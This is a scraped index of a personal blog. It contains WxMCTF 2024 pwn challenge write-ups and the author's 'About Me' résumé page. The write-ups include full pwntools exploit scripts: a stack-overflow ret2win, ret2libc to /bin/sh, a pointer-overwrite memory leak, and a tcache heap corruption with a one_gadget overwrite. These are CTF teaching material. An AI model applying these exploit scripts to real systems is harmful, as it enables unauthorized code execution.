Buddhathe18th, always reluctant to do homework, decided to investigate this exploit himself for the notorious 3.2 STACK Part 2 Challenge. He vaguely recalls that it involves inputting a string into the answer box, but with 1 hour left, he needs some help. Could you help him find the exploit? ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis There is no server information. Just one binary. At first, I read the problem description and thought it was supposed to provide an exploit method related to the binary. But this was a bad idea and I wasted some time because of it. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf[126]; // [rsp+40h] [rbp-3F0h] BYREF buf[125] = __readfsqword(0x28u); puts( \"The graph of the polynomial function f(x) = -2x^4-16x^3-49x^2-68x-33 is symmetric with respect to a vertical line. F\" \"ind the equation of this vertical line:\\n\" \"x= \"); memset(buf, 0, 1000); read(0, buf, 0x3E8uLL); printf((const char *)buf); // Format String Bug if ( !strcmp((const char *)buf, \"3\\n\") ) printf(\"\\nCorrect!\"); else printf(\"\\nIncorrect!\"); return 0; } ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Solve If you open the binary with IDA, you can immediately find a format string bug, which made me confused. But this challenge is baby baby baby challenge, so if you open the binary through gdb and run it for a bit, you can see the flags stored upside down in the stack by 4 bytes. pwndbg\u003e stack 50 00:0000‚îÇ rsp 0x7fffffffdeb0 ‚óÇ‚Äî 'cmxw m{ft ld00 4m_3 r3t5 dn1m }!!! ' 01:0008‚îÇ-428 0x7fffffffdeb8 ‚óÇ‚Äî 'm{ft ld00 4m_3 r3t5 dn1m }!!! ' 02:0010‚îÇ-420 0x7fffffffdec0 ‚óÇ‚Äî 'ld00 4m_3 r3t5 dn1m }!!! ' 03:0018‚îÇ-418 0x7fffffffdec8 ‚óÇ‚Äî '4m_3 r3t5 dn1m }!!! ' 04:0020‚îÇ-410 0x7fffffffded0 ‚óÇ‚Äî 'r3t5 dn1m }!!! ' 05:0028‚îÇ-408 0x7fffffffded8 ‚óÇ‚Äî 'dn1m }!!! ' 06:0030‚îÇ-400 0x7fffffffdee0 ‚óÇ‚Äî '}!!! ' flag wxmctf{m00dl3_m45t3rm1nd!!!} ","date":"2024-04-07","objectID":"/wxmctf_2024/:1:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"TEJ3M Description Here‚Äôs my TEJ3M assignment! We‚Äôre learning how to use C, and I think it‚Äôs pretty easy! My teacher tells us gets is unsafe, but I think he doesn‚Äôt know how to error trap! ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, so easy to analysis. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e void win(){ system(\"cat flag.txt\"); } void func(){ char buf[040]; while(1) { puts(\"Enter your info: \\n\"); gets(buf); if(strlen(buf) \u003c 31) { puts(\"Thank you for valid data!!!\\n\"); break; } puts(\"My teacher says that's unsafe!\\n\"); } } void main() { setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); func(); } Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) As you can see, it is a 32-bit binary with no stack canary or PIE, and a stack overflow occurs through the gets function. And thankfully the win function exists. EZPZ ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./assgn1_2o3BvZ6\") p = remote(\"f61841b.678470.xyz\", 30717) e = ELF(\"./assgn1_2o3BvZ6\") p.sendline(b\"a\" * 44 + p32(e.sym.win)) p.interactive() flag wxmctf{1_th1nk_1_f41led...} ","date":"2024-04-07","objectID":"/wxmctf_2024/:2:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Nah id win Description As the strongest problem in history faced off against the strongest pwner of today, they asked it: ‚ÄúAre you the shell because you are /bin/sh? Or are you /bin/sh because you are the shell?‚Äù The pwner laughed. ‚ÄúStand proud. You are strong.‚Äù said the pwner. At this moment, the pwner used their domain expansion. ‚ÄúDOMAIN EXPANSION. ret2libc.‚Äù The problem began using reverse pwn technique, but it wasn‚Äôt enough. The domain was simply too strong. However, the problem had not yet used its domain expansion. ‚ÄúDOMAIN EXPANSION: Return restrictions.‚Äù The problem said, and the domain was instantly shattered. ‚ÄúNah, I‚Äôd win.‚Äù The problem said, and the pwner was dealt with. ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis If you read the description, you can see that the author is a fan of Jujutsu Kaisen. lol ‚ÄúDOMAIN EXPANSION. ret2libc.‚Äù This challenge give source code, binary and libc. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int vuln() { char buf[0x20]; printf(\"My cursed technique is revealing libc... %p\\n\",printf); gets(buf); if(__builtin_return_address(0) \u003c 0x90000000) { return 0; } printf(\"NAH I'D WIN!\\n\"); exit(0); } int main() { setvbuf(stdin, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return 0; } Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) This is another vulnerable 32-bit binary. There is no win function, but you can see from the description that you can use the ret2libc technique. In vuln function, we can get libc leak. So, just do ret2libc. ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./vuln\", env={\"LD_PRELOAD\":\"./libc.so.6\"}) p = remote(\"7d9d14b.678470.xyz\", 31709) e = ELF(\"./vuln\") libc = ELF(\"./libc.so.6\") context.terminal = ['tmux', 'splitw', '-h'] p.recvuntil(b\"My cursed technique is revealing libc... \") libc_leak = int(p.recvline().strip(), 16) - 0x57a90 log.info(\"libc base: \" + hex(libc_leak)) system = libc_leak + libc.sym.system binsh = libc_leak + next(libc.search(b\"/bin/sh\")) #gdb.attach(p) p.sendline(b\"a\" * 44 + p32(0x0804900e) + p32(system) + p32(binsh) + p32(binsh)) p.interactive() flag wxmctf{d0main_expansion:ret2libc.} ","date":"2024-04-07","objectID":"/wxmctf_2024/:3:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"leakleakleak Description Leak, leak, leak, leak, I want you in my leak! ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, binary and Dockerfile. // compile with: gcc leakleakleak.c -o leakleakleak -fpie -pie #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003cstring.h\u003e #include \u003cfcntl.h\u003e char flag[128] = {0}; typedef struct { char username[32]; char *description; } User; void warmup_heap(void) { void *addrs[3]; for (size_t i = 0; i \u003c 3; ++i) { addrs[i] = malloc(9000); } free(addrs[1]); } User *create_user(void) { User *user = calloc(1, sizeof (User)); user-\u003edescription = calloc(1, 256); return user; } void destroy_user(User *user) { free(user-\u003edescription); free(user); } void init(void) { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void read_flag(void) { int flag_fd = open(\"./flag.txt\", O_RDONLY); off_t flag_size = lseek(flag_fd, 0, SEEK_END); lseek(flag_fd, 0, SEEK_SET); read(flag_fd, flag, flag_size); flag[flag_size] = '\\00'; close(flag_fd); } int main() { init(); read_flag(); warmup_heap(); User *user = create_user(); for (_Bool quit = 0; !quit; ) { printf(\"What is your name? \"); read(STDIN_FILENO, user, sizeof(*user)); printf(\"Hello %s!\\n\", user-\u003eusername); puts(\"Let me tell you something about yourself! :3\"); printf(\"%s\\n\", user-\u003edescription); printf(\"Continue? (Y/n) \"); char c = getchar(); if (c == 'n' || c == 'N') quit = 1; } puts(\"Boom! Boom, boom, boom! I want YOU in my room!\"); destroy_user(user); return 0; } Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled First 64-bit Binary with Partial RELRO!! The vulnerability is that in read(STDIN_FILENO, user, sizeof(*user));, the description member in User structure, which is char*, can be manipulated by receiving input equal to the size of the User structure. We can use AAR with printf(\"%s\\n\", user-\u003edescription);. ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit We have AAR. So I use AAR to leak heap -\u003e leak libc -\u003e leak environ -\u003e leak flag. from pwn import * p = process(\"./leakleakleak\") libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' # p = remote(\"32cb2f5.678470.xyz\", 32411) pay = b\"a\" * 33 p.sendafter(b\"?\", pay) p.recvuntil(pay) res = (u64(p.recvn(5).ljust(8, b\"\\x00\")) \u003c\u003c 8) print(hex(res)) p.sendlineafter(b\"?\", b\"Y\") pay = b\"a\" * 32 + p64(res+ 0x118) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(hex(res)) pay = b\"a\" * 32 + p64(res+ 0x6e80) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(\"environ\" + hex(res)) p.sendlineafter(b\"?\", b\"Y\") pay = b\"a\" * 32 + p64(res-0x30) p.sendafter(b\"?\", pay) p.recvuntil(b\":3\\n\") res = u64(p.recvn(6).ljust(8, b\"\\x00\")) print(hex(res)) #gdb.attach(p) pay = b\"a\" * 32 + p64(res+ 0x2fab) p.sendafter(b\"?\", pay) p.interactive() flag wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c} ","date":"2024-04-07","objectID":"/wxmctf_2024/:4:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"lain_writes_in_lisp Description Have you read your SICP today? HINT: After you get the leaks there‚Äôs an almost arbitrarily long overflow on the heap in the ‚Äúadd_token‚Äù function. Use it to corrupt the heap‚Äôs metadata. I First-Blooded this Challenge!! ","date":"2024-04-07","objectID":"/wxmctf_2024/:5:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Analysis This challenge give source code, binary and Dockerfile. #include \u003cctype.h\u003e #include \u003cstdint.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cstdbool.h\u003e #include \u003cunistd.h\u003e #define MAX_TOKEN_SIZE 1024 #define next(token) (*(token) = (*(token))-\u003enext) typedef struct token { char *str; struct token *next; } Token; typedef enum { none, number, string, function } Type; typedef struct number { int64_t value; } Number; typedef struct string { char *str_ptr; size_t str_len; } String; typedef struct function { char *function_name; } Function; typedef struct node { Type type; struct node *child_nodes; struct node *next; union { Number number; String string; Function func; } value; } Node; _Bool panic = false; void boot_os(void); void add_token(const char *token_str, size_t token_len, Token **beg, Token **end); void destroy_tokens(Token *token); Token *tokenize(const char *s, size_t len); Node *create_node(void); void destroy_nodes(Node *node); _Bool is_number(const char *s); char *get_string_literal(char *s, size_t *ret_len); char *get_function_by_name(char *s); Node *parse_token(Token **token); Node *parse_expr(Token **token); Node *eval_function(Node *node); Node *eval(Node *node); Node *plus_fnc(Node *args); Node *mul_fnc(Node *args); Node *none_fnc(Node *args); void print_node(Node *args); int main(); void boot_os(void) { setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } void add_token(const char *token_str, size_t token_len, Token **beg, Token **end) { Token *new_token = calloc(1, sizeof (Token)); if (new_token == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } new_token-\u003enext = NULL; new_token-\u003estr = calloc(1, strlen(token_str) + 1); if (new_token-\u003estr == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } memcpy(new_token-\u003estr, token_str, token_len); if (*beg == NULL) { *beg = new_token; *end = new_token; } else { (*end)-\u003enext = new_token; *end = new_token; } } void destroy_tokens(Token *token) { if (token == NULL) return; destroy_tokens(token-\u003enext); free(token-\u003estr); free(token); } Token *tokenize(const char *s, size_t len) { char token_str[MAX_TOKEN_SIZE + 1]; size_t token_length = 0; Token *beg = NULL; Token *end = NULL; _Bool inside_string = false; for (size_t i = 0; i \u003c len; ++i) { char c = s[i]; if ((c == ' ' || c == '\\n' || c == '(' || c == ')') \u0026\u0026 !inside_string) { if (token_length != 0) { token_str[token_length] = '\\0'; add_token(token_str, token_length, \u0026beg, \u0026end); token_length = 0; } if (c == '(') { add_token(\"(\", 1, \u0026beg, \u0026end); } else if (c == ')') { add_token(\")\", 1, \u0026beg, \u0026end); } } else if (token_length \u003c= MAX_TOKEN_SIZE) { token_str[token_length++] = c; } else { panic = true; fprintf(stderr, \"Token too long! Aborting...\\n\"); return beg; } if (c == '\"') { if (inside_string) { token_str[token_length] = '\\0'; add_token(token_str, token_length, \u0026beg, \u0026end); token_length = 0; } inside_string = !inside_string; } } return beg; } Node *create_node(void) { Node *node = malloc(sizeof (Node)); if (node == NULL) { fprintf(stderr, \"I just don't know what went wrong...\\n\"); exit(-1); } node-\u003echild_nodes = NULL; node-\u003enext = NULL; node-\u003etype = none; return node; } void destroy_nodes(Node *node) { if (node == NULL) return; if (node-\u003echild_nodes != NULL) destroy_nodes(node-\u003echild_nodes); if (node-\u003enext != NULL) destroy_nodes(node-\u003enext); if (node-\u003etype == string) free(node-\u003evalue.string.str_ptr); free(node); } _Bool is_number(const char *s) { while (*s) if (!isdigit(*s++)) return false; return true; } char *get_string_literal(char *s, size_t *ret_len) { if (s == NULL) return NULL; if (*s != '\"') return NULL; size_t len = 1; while (s[len] != '\"') ++len; char *new_s = calloc(1, len+1); memcpy(new_s, s+1, len-1); new_s[len] = '\\0'; *ret_len = len-1; return new_s; } char *get_function_by_name(char *s) { if (strcmp(s, \"+\") == 0) { return \"+\"; } else if (strcmp(s, \"*\") == 0) { return \"*\"; } else { return NULL; } } Node *parse","date":"2024-04-07","objectID":"/wxmctf_2024/:5:1","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Exploit from pwn import * #p = process(\"./lain\") p = remote(\"50790b2.678470.xyz\", 31454) e = ELF(\"./lain\") context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' def leak(addr): p.sendlineafter(b\"\u003c\u003c\u003c\", \"(+ \\\"\\\" \" + str(addr) + \")\") a = \"a\" * 0x98 p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ 0 \\\"a\\\")\") res = int(p.recvline().strip(), 10) print(hex(res)) p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"{a}\\\" \\\"{a}\\\")\") p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"{a}\\\" \\\"{a}\\\")\") p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"\\\" \\\"aaaaaaaa\\\")\") key = res \u003e\u003e 12 print(key) off = res + 0x698 leak(off) p.recvn(1) libc_base = u64(p.recvn(6).ljust(8, b\"\\x00\")) - 0x21ace0 og = libc_base + 0xebd38 print(hex(og)) # gdb.attach(p) p.sendlineafter(b\"\u003c\u003c\u003c\", b\"(+ \" + p64(0) *2 + b\" \" + p64(0x411) *4 + p64((libc_base+0x21a000) ^ key) + b\")\") b = b\"a\" * 0x98 + p64(og)[:6] p.sendlineafter(b\"\u003c\u003c\u003c\", f\"(+ \\\"\".encode() + b + f\"\\\" \\\"\".encode() + b + f\"\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\" \\\"{a}\\\")\".encode()) p.interactive() To exploit the binary, I leaked the heap address and then leaked the address of libc remaining in the heap. After that, I was able to exploit the binary by using the overflow vulnerability to manipulate the tcache of size 0xa0 and overwrite libc got with one_gadget. flag wxmctf{(did (you (know (?))))(lisp (is (the (most (powerful (language))))))!!} author writup link ","date":"2024-04-07","objectID":"/wxmctf_2024/:5:2","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":null,"content":"Intro Sungmin Kim (a.k.a kimg00n) Raon Secure Core Research Team Konyang Univ, Cyber Security undergraduate Interested in Pwnable In SaturnX Team(CTF Player) Skills System Hacking, Reversing C Node.js Docker Solidity etc‚Ä¶ Experiences 2019.12 ~ 2021.7 Republic of Korea Air Force Information Security Soldier 2021.7 ~ 2021.12 Big data analysis and security expert training in Pyeongtaek city ELK Logging Project 2022.3 ~ 2022.9 Konyang University 5th K-CTF PL Guidance on problem solving in making challenges 2022.7 ~ 2023.3 KITRI Best of the Best(BoB) 11th vulnerability analysis Track 2022.8 ~ 2022.12 UEFI Exploitation Fuzzer project in BoB MCD Team Our Project Gitbook UEFI Security Paper CISC-W'22 Poster session accepted CVE-2023-27471(SA-2023036) SVE-2023-0437(CVE-2023-30738) 2023.3 ~ 2023.12 Chairman of Impes, a cyber security club at Konyang University 2024.2 ~ now Core Research Team in Raon Secure üö©CTFs 2023.03 Wolv CTF 2023 6th place in SaturnX 2023.05 DEFCON31 Qual 17th place in untitled 2023.08 ESCAPE CTF 2023 Pre 6th place in ÌïúÏûÖÎ≥¥Ïù¥ 2023.08 Samsung Security Tech Forum CTF 6th place in SaturnX 2024.02 ESCAPE CTF 2023 Final 4th place in SaturnX 2024.03 WxMCTF 2024 2nd place in Megaricano 2024.03 VolgaCTF 2024 Qualifier 6th place in SaturnX 2024.08 CCE 2024 Qualifier Gov division Finalist in KRAF 2024.09 CCE 2024 Final Gov division 6th place in KRAF 2024.09 Defcamp CTF 2024 Qualifier Finalist in SaturnX etc‚Ä¶ üèÜ¬†Awards 2020.11 Konyang University 3rd K-CTF 2nd Prize 2023.09 Cyber Security Conference at HONAM Ïõπ Ï∑®ÏïΩÏ†ê Í≤ΩÏßÑÎåÄÌöå 3rd Prize ","date":"2024-04-07","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]